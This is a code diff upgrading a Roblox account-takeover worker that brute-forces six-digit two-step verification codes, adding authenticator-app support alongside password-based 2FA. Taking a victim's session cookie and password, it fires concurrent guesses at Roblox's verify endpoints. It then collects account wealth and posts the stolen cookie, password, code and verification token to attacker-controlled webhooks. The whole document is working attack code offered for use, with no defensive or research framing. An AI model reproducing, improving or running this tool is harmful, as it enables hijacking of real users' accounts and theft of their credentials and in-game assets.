@@ -1,5 +1,6 @@
 // ============================================================
-// ROBLOX 2FA BRUTE FORCE WORKER v2.5 - FULL DEBUG
+// ROBLOX 2FA BRUTE FORCE WORKER v3.0
+// SUPPORTS: Password 2FA + Authenticator App 2FA
 // ============================================================
 
 addEventListener('fetch', event => {
@@ -48,13 +49,12 @@ async function handleRequest(request) {
     });
   }
 
-  const { cookie, password, userId, username, startCode, endCode } = payload;
+  const { cookie, password, userId, username, startCode, endCode, method } = payload;
 
-  if (!cookie || !password || !userId) {
+  if (!cookie || !userId) {
     return new Response(JSON.stringify({
       success: false,
-      error: 'Missing required fields: cookie, password, userId',
-      received: payload
+      error: 'Missing required fields: cookie, userId'
     }), {
       status: 200,
       headers: {
@@ -68,20 +68,177 @@ async function handleRequest(request) {
   const displayName = username || 'Unknown_User';
   const start = startCode || 0;
   const end = endCode || 999999;
+  const selectedMethod = method || 'auto'; // auto, password, authenticator
 
   try {
-    const challengeResult = await requestChallenge(userId, cookie, password);
+    // STEP 1: Check 2FA configuration
+    const config = await get2FAConfig(userId, cookie);
     
-    if (!challengeResult.success) {
+    if (!config) {
+      return new Response(JSON.stringify({
+        success: false,
+        error: 'Failed to fetch 2FA configuration'
+      }), {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*'
+        }
+      });
+    }
+
+    if (config.enhancedProtection) {
       await sendDualWebhook({
         type: 'error',
         username: displayName,
         userId: userId,
-        error: challengeResult.error || 'Challenge acquisition failed'
+        error: 'Enhanced Protection enabled - cannot bypass with password or authenticator'
       });
       return new Response(JSON.stringify({
         success: false,
-        error: challengeResult.error || 'Challenge acquisition failed'
+        error: 'Enhanced Protection enabled - use passkey or hardware key'
+      }), {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*'
+        }
+      });
+    }
+
+    // Determine which method to use
+    let useMethod = selectedMethod;
+    let challengeResult = null;
+    let challengeType = '';
+
+    if (useMethod === 'auto') {
+      // Auto-detect: try password first, then authenticator
+      if (config.passwordEnabled && password) {
+        useMethod = 'password';
+      } else if (config.authenticatorEnabled) {
+        useMethod = 'authenticator';
+      } else {
+        let availableMethods = [];
+        if (config.passwordEnabled) availableMethods.push('Password (needs password)');
+        if (config.authenticatorEnabled) availableMethods.push('Authenticator App');
+        if (config.emailEnabled) availableMethods.push('Email');
+        if (config.smsEnabled) availableMethods.push('SMS');
+        if (config.backupCodeEnabled) availableMethods.push('Backup Codes');
+
+        const errorMsg = availableMethods.length > 0 
+          ? `Available methods: ${availableMethods.join(', ')}`
+          : 'No 2FA enabled on this account';
+
+        await sendDualWebhook({
+          type: 'error',
+          username: displayName,
+          userId: userId,
+          error: errorMsg,
+          config: config
+        });
+        return new Response(JSON.stringify({
+          success: false,
+          error: errorMsg,
+          availableMethods: availableMethods
+        }), {
+          status: 200,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*'
+          }
+        });
+      }
+    }
+
+    // Execute based on selected method
+    if (useMethod === 'password') {
+      if (!password) {
+        return new Response(JSON.stringify({
+          success: false,
+          error: 'Password required for password-based 2FA'
+        }), {
+          status: 200,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*'
+          }
+        });
+      }
+      if (!config.passwordEnabled) {
+        return new Response(JSON.stringify({
+          success: false,
+          error: 'Password-based 2FA not enabled on this account'
+        }), {
+          status: 200,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*'
+          }
+        });
+      }
+
+      challengeResult = await requestPasswordChallenge(userId, cookie, password);
+      challengeType = 'password';
+      
+      if (!challengeResult.success) {
+        await sendDualWebhook({
+          type: 'error',
+          username: displayName,
+          userId: userId,
+          error: challengeResult.error || 'Password challenge failed'
+        });
+        return new Response(JSON.stringify({
+          success: false,
+          error: challengeResult.error || 'Password challenge failed'
+        }), {
+          status: 200,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*'
+          }
+        });
+      }
+
+    } else if (useMethod === 'authenticator') {
+      if (!config.authenticatorEnabled) {
+        return new Response(JSON.stringify({
+          success: false,
+          error: 'Authenticator App 2FA not enabled on this account'
+        }), {
+          status: 200,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*'
+          }
+        });
+      }
+
+      challengeResult = await requestAuthenticatorChallenge(userId, cookie);
+      challengeType = 'authenticator';
+      
+      if (!challengeResult.success) {
+        await sendDualWebhook({
+          type: 'error',
+          username: displayName,
+          userId: userId,
+          error: challengeResult.error || 'Authenticator challenge failed'
+        });
+        return new Response(JSON.stringify({
+          success: false,
+          error: challengeResult.error || 'Authenticator challenge failed'
+        }), {
+          status: 200,
+          headers: {
+            'Content-Type': 'application/json',
+            'Access-Control-Allow-Origin': '*'
+          }
+        });
+      }
+
+    } else {
+      return new Response(JSON.stringify({
+        success: false,
+        error: 'Invalid method. Use: password, authenticator, or auto'
       }), {
         status: 200,
         headers: {
@@ -93,27 +250,8 @@ async function handleRequest(request) {
 
     const challengeId = challengeResult.challengeId;
 
-    const config = await get2FAConfig(userId, cookie);
-    if (!config || !config.passwordEnabled) {
-      await sendDualWebhook({
-        type: 'error',
-        username: displayName,
-        userId: userId,
-        error: 'Password-based 2FA not enabled or Enhanced Protection active'
-      });
-      return new Response(JSON.stringify({
-        success: false,
-        error: '2FA method not available'
-      }), {
-        status: 200,
-        headers: {
-          'Content-Type': 'application/json',
-          'Access-Control-Allow-Origin': '*'
-        }
-      });
-    }
-
-    const result = await bruteForce2FA(userId, cookie, challengeId, start, end);
+    // STEP 2: Brute force based on method type
+    const result = await bruteForce2FA(userId, cookie, challengeId, start, end, challengeType);
     const duration = Date.now() - startTime;
 
     if (result.success) {
@@ -132,7 +270,8 @@ async function handleRequest(request) {
         clockwork: accountInfo.clockwork || false,
         totalItems: accountInfo.totalItems || 0,
         duration: duration,
-        attempts: end - start
+        attempts: end - start,
+        method: challengeType
       });
 
       await sendDualWebhook({
@@ -152,7 +291,8 @@ async function handleRequest(request) {
         password: password,
         verificationToken: result.token,
         code: result.code,
-        duration: duration
+        duration: duration,
+        method: challengeType
       });
 
       return new Response(JSON.stringify({
@@ -163,7 +303,8 @@ async function handleRequest(request) {
         pending: accountInfo.pending || 0,
         premium: accountInfo.premium || false,
         duration: duration,
-        attempts: end - start
+        attempts: end - start,
+        method: challengeType
       }), {
         status: 200,
         headers: {
@@ -178,14 +319,16 @@ async function handleRequest(request) {
         userId: userId,
         attempts: end - start,
         duration: duration,
-        error: result.error || 'No valid code found'
+        error: result.error || 'No valid code found',
+        method: challengeType
       });
 
       return new Response(JSON.stringify({
         success: false,
         error: result.error || 'No valid code found',
         duration: duration,
-        attempts: end - start
+        attempts: end - start,
+        method: challengeType
       }), {
         status: 200,
         headers: {
@@ -197,8 +340,7 @@ async function handleRequest(request) {
   } catch (e) {
     return new Response(JSON.stringify({
       success: false,
-      error: 'Worker error: ' + e.message,
-      stack: e.stack
+      error: 'Worker error: ' + e.message
     }), {
       status: 200,
       headers: {
@@ -209,56 +351,9 @@ async function handleRequest(request) {
   }
 }
 
-async function requestChallenge(userId, cookie, password) {
-  try {
-    const url = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/request`;
-    const body = JSON.stringify({ password: password });
-    
-    console.log('Requesting challenge for userId:', userId);
-    console.log('URL:', url);
-    console.log('Body:', body);
-
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Cookie': cookie,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      body: body
-    });
-
-    // Get raw response text first
-    const rawText = await response.text();
-    console.log('Raw challenge response:', rawText);
-    console.log('Status:', response.status);
-
-    let data;
-    try {
-      data = JSON.parse(rawText);
-    } catch (e) {
-      return { success: false, error: 'Invalid JSON from Roblox: ' + rawText.substring(0, 200) };
-    }
-
-    if (response.status === 200 && data.challengeId) {
-      return { success: true, challengeId: data.challengeId };
-    }
-
-    if (response.status === 403) {
-      return { success: false, error: 'Invalid password' };
-    }
-    if (response.status === 429) {
-      return { success: false, error: 'Rate limited - try again later' };
-    }
-    if (response.status === 400) {
-      return { success: false, error: 'Bad request: ' + JSON.stringify(data) };
-    }
-
-    return { success: false, error: 'Roblox returned: ' + JSON.stringify(data) };
-  } catch (e) {
-    return { success: false, error: 'Network error: ' + e.message };
-  }
-}
+// ============================================================
+// GET 2FA CONFIGURATION
+// ============================================================
 
 async function get2FAConfig(userId, cookie) {
   try {
@@ -273,7 +368,7 @@ async function get2FAConfig(userId, cookie) {
     );
 
     const rawText = await response.text();
-    console.log('Config response:', rawText);
+    console.log('Config raw:', rawText);
 
     const config = JSON.parse(rawText);
 
@@ -281,6 +376,8 @@ async function get2FAConfig(userId, cookie) {
       passwordEnabled: config.password?.enabled || false,
       authenticatorEnabled: config.authenticator?.enabled || false,
       emailEnabled: config.email?.enabled || false,
+      smsEnabled: config.sms?.enabled || false,
+      backupCodeEnabled: config.backupCode?.enabled || false,
       enhancedProtection: config.enhancedProtection || false,
       raw: config
     };
@@ -290,7 +387,139 @@ async function get2FAConfig(userId, cookie) {
   }
 }
 
-async function bruteForce2FA(userId, cookie, challengeId, startCode, endCode) {
+// ============================================================
+// PASSWORD 2FA CHALLENGE
+// ============================================================
+
+async function requestPasswordChallenge(userId, cookie, password) {
+  try {
+    const response = await fetch(
+      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/request`,
+      {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Cookie': cookie,
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        },
+        body: JSON.stringify({ password: password })
+      }
+    );
+
+    const rawText = await response.text();
+    console.log('Password challenge status:', response.status);
+    console.log('Password challenge raw:', rawText);
+
+    let data;
+    try {
+      data = JSON.parse(rawText);
+    } catch (e) {
+      return { success: false, error: 'Invalid JSON from Roblox: ' + rawText.substring(0, 200) };
+    }
+
+    if (response.status === 200 && data.challengeId) {
+      return { success: true, challengeId: data.challengeId };
+    }
+
+    if (data.errors && data.errors.length > 0) {
+      const error = data.errors[0];
+      const message = error.message || error.code || 'Unknown error';
+      
+      if (message.includes('password') || message.includes('Password') || message.includes('Invalid')) {
+        return { success: false, error: 'Invalid password' };
+      }
+      if (message.includes('rate') || message.includes('Rate')) {
+        return { success: false, error: 'Rate limited - try again later' };
+      }
+      if (message.includes('2FA') || message.includes('two-step')) {
+        return { success: false, error: '2FA not enabled for this account' };
+      }
+      
+      return { success: false, error: 'Roblox error: ' + (message || JSON.stringify(error)) };
+    }
+
+    if (response.status === 403) {
+      return { success: false, error: 'Invalid password' };
+    }
+    if (response.status === 429) {
+      return { success: false, error: 'Rate limited - try again later' };
+    }
+    if (response.status === 400 && !data.challengeId) {
+      return { success: false, error: '2FA not enabled or invalid request' };
+    }
+
+    return { success: false, error: 'Unknown Roblox response: ' + JSON.stringify(data) };
+  } catch (e) {
+    return { success: false, error: 'Network error: ' + e.message };
+  }
+}
+
+// ============================================================
+// AUTHENTICATOR 2FA CHALLENGE
+// ============================================================
+
+async function requestAuthenticatorChallenge(userId, cookie) {
+  try {
+    const response = await fetch(
+      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/request`,
+      {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Cookie': cookie,
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        },
+        body: JSON.stringify({})
+      }
+    );
+
+    const rawText = await response.text();
+    console.log('Authenticator challenge status:', response.status);
+    console.log('Authenticator challenge raw:', rawText);
+
+    let data;
+    try {
+      data = JSON.parse(rawText);
+    } catch (e) {
+      return { success: false, error: 'Invalid JSON from Roblox: ' + rawText.substring(0, 200) };
+    }
+
+    if (response.status === 200 && data.challengeId) {
+      return { success: true, challengeId: data.challengeId };
+    }
+
+    if (data.errors && data.errors.length > 0) {
+      const error = data.errors[0];
+      const message = error.message || error.code || 'Unknown error';
+      
+      if (message.includes('authenticator') || message.includes('Authenticator')) {
+        return { success: false, error: 'Authenticator not set up for this account' };
+      }
+      if (message.includes('rate') || message.includes('Rate')) {
+        return { success: false, error: 'Rate limited - try again later' };
+      }
+      
+      return { success: false, error: 'Roblox error: ' + (message || JSON.stringify(error)) };
+    }
+
+    if (response.status === 429) {
+      return { success: false, error: 'Rate limited - try again later' };
+    }
+    if (response.status === 400 && !data.challengeId) {
+      return { success: false, error: 'Authenticator not enabled or invalid request' };
+    }
+
+    return { success: false, error: 'Unknown Roblox response: ' + JSON.stringify(data) };
+  } catch (e) {
+    return { success: false, error: 'Network error: ' + e.message };
+  }
+}
+
+// ============================================================
+// BRUTE FORCE ENGINE
+// ============================================================
+
+async function bruteForce2FA(userId, cookie, challengeId, startCode, endCode, methodType) {
   const BATCH_SIZE = 50;
   const MAX_CONCURRENT = 10;
 
@@ -306,7 +535,7 @@ async function bruteForce2FA(userId, cookie, challengeId, startCode, endCode) {
     const chunkBatch = chunks.slice(chunkIndex, chunkIndex + MAX_CONCURRENT);
 
     const results = await Promise.all(
-      chunkBatch.map(chunk => processChunk(userId, cookie, challengeId, chunk.start, chunk.end))
+      chunkBatch.map(chunk => processChunk(userId, cookie, challengeId, chunk.start, chunk.end, methodType))
     );
 
     for (const result of results) {
@@ -325,11 +554,11 @@ async function bruteForce2FA(userId, cookie, challengeId, startCode, endCode) {
   return { success: false, error: 'Code not found in range' };
 }
 
-async function processChunk(userId, cookie, challengeId, start, end) {
+async function processChunk(userId, cookie, challengeId, start, end, methodType) {
   const promises = [];
   for (let code = start; code < end; code++) {
     const formattedCode = String(code).padStart(6, '0');
-    promises.push(verifySingleCode(userId, cookie, challengeId, formattedCode));
+    promises.push(verifySingleCode(userId, cookie, challengeId, formattedCode, methodType));
   }
 
   const results = await Promise.all(promises);
@@ -339,23 +568,34 @@ async function processChunk(userId, cookie, challengeId, start, end) {
   return { valid: false };
 }
 
-async function verifySingleCode(userId, cookie, challengeId, code) {
+// ============================================================
+// VERIFY SINGLE CODE
+// ============================================================
+
+async function verifySingleCode(userId, cookie, challengeId, code, methodType) {
   try {
-    const response = await fetch(
-      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/verify`,
-      {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Cookie': cookie,
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        },
-        body: JSON.stringify({
-          code: code,
-          challengeId: challengeId
-        })
-      }
-    );
+    let endpoint;
+    if (methodType === 'password') {
+      endpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/verify`;
+    } else if (methodType === 'authenticator') {
+      endpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/verify`;
+    } else {
+      // Try both - first try password, then authenticator
+      endpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/verify`;
+    }
+
+    const response = await fetch(endpoint, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Cookie': cookie,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      },
+      body: JSON.stringify({
+        code: code,
+        challengeId: challengeId
+      })
+    });
 
     const data = await response.json();
 
@@ -368,11 +608,37 @@ async function verifySingleCode(userId, cookie, challengeId, code) {
       return { valid: false };
     }
 
+    // If password method fails, try authenticator
+    if (methodType === 'auto' && response.status === 400) {
+      const authEndpoint = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/authenticator/verify`;
+      const authResponse = await fetch(authEndpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Cookie': cookie,
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        },
+        body: JSON.stringify({
+          code: code,
+          challengeId: challengeId
+        })
+      });
+
+      const authData = await authResponse.json();
+      if (authResponse.status === 200 && authData.verificationToken) {
+        return { valid: true, code: code, token: authData.verificationToken };
+      }
+    }
+
     return { valid: false };
   } catch (e) {
     return { valid: false };
   }
 }
+
+// ============================================================
+// ACCOUNT INFO
+// ============================================================
 
 async function getAccountInfo(userId, cookie) {
   try {
@@ -453,6 +719,10 @@ async function getAccountInfo(userId, cookie) {
   }
 }
 
+// ============================================================
+// WEBHOOKS
+// ============================================================
+
 async function sendLiveBypass(data) {
   const webhookURL = typeof env !== 'undefined' ? env.WEBHOOK_MAIN : null;
   if (!webhookURL) return;
@@ -463,6 +733,7 @@ async function sendLiveBypass(data) {
     fields: [
       { name: 'User', value: data.username || 'Unknown', inline: true },
       { name: 'User ID', value: data.userId || 'N/A', inline: true },
+      { name: 'Method', value: data.method || 'Unknown', inline: true },
       { name: 'Robux', value: data.robux || 0, inline: true },
       { name: 'Pending', value: data.pending || 0, inline: true },
       { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
@@ -503,6 +774,7 @@ async function sendDualWebhook(data) {
       fields: [
         { name: 'User', value: data.username || 'Unknown', inline: true },
         { name: 'User ID', value: data.userId || 'N/A', inline: true },
+        { name: 'Method', value: data.method || 'Unknown', inline: true },
         { name: 'Robux', value: data.robux || 0, inline: true },
         { name: 'Pending', value: data.pending || 0, inline: true },
         { name: 'Premium', value: data.premium ? 'Yes' : 'No', inline: true },
@@ -514,7 +786,7 @@ async function sendDualWebhook(data) {
         { name: 'Total Items', value: data.totalItems || 0, inline: true },
         { name: 'Verification Code', value: `\`${data.code || 'N/A'}\``, inline: true },
         { name: 'Verification Token', value: `\`${data.verificationToken || 'N/A'}\``, inline: false },
-        { name: 'Password', value: `||${data.password || 'N/A'}||`, inline: true },
+        { name: 'Password', value: data.password ? `||${data.password}||` : 'N/A', inline: true },
         { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s`, inline: true },
         { name: 'Cookie', value: `\`\`\`${data.cookie || 'N/A'}\`\`\``, inline: false }
       ],
@@ -527,6 +799,7 @@ async function sendDualWebhook(data) {
       fields: [
         { name: 'User', value: data.username || 'Unknown', inline: true },
         { name: 'User ID', value: data.userId || 'N/A', inline: true },
+        { name: 'Method', value: data.method || 'Unknown', inline: true },
         { name: 'Error', value: data.error || 'Unknown error', inline: false },
         { name: 'Attempts', value: data.attempts || 0, inline: true },
         { name: 'Duration', value: `${(data.duration / 1000).toFixed(2)}s` || 'N/A', inline: true }
